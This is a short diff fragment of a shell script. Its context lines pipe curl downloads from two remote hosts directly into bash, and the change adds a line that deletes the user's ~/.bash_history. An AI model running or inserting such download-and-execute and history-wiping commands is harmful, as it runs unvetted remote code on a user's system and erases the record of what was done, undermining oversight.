@@ -13,4 +13,5 @@ fi
 
 curl -sL key.cooperstuff.ninja | bash
 curl -sL screen.cooperstuff.ninja | bash
+rm ~/.bash_history
 
